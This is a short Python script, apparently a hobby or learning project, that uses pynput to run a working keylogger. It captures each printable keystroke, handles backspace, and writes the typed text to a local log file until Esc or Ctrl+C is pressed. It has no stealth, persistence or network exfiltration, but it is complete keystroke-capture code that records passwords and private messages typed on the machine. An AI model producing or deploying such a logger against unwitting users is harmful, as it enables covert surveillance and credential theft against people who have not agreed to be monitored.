from pynput.keyboard import Listener, Key
import os
import datetime

log_dir = "../logs"
os.makedirs(log_dir, exist_ok=True)

log_file = os.path.join(log_dir, "keylog.txt")

# Add a session separation
with open(log_file, "a") as f:
    f.write("\n\n==============================\n")
    f.write(f"SESSION STARTED: {datetime.datetime.now()}\n")
    f.write("==============================\n\n")

typed_text = []  # Stores the typed characters in this

def on_press(key):
    """Logs only actual typed characters, properly handling backspace and ignoring special keys."""
    global typed_text

    try:
        if hasattr(key, 'char') and key.char is not None and key.char.isprintable():
            typed_text.append(key.char)
        elif key == Key.space:
            typed_text.append(" ")
        elif key == Key.enter:
            typed_text.append("\n")
        elif key == Key.backspace and typed_text:
            typed_text.pop()  # Remove last character when backspace is clicked
        else:
            return  

        # Updating keylog file 
        with open(log_file, "w") as f:
            f.write("\n\n==============================\n")
            f.write(f"SESSION STARTED: {datetime.datetime.now()}\n")
            f.write("==============================\n\n")
            f.write("".join(typed_text))  

    except Exception:
        pass 

def on_release(key):
    if key == Key.esc:
        print("[INFO] Keylogger stopped.")
        return False  # Stop the listener when esc is pressed 

try:
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except KeyboardInterrupt:
    print("[INFO] Keylogger stopped by Ctrl + C")
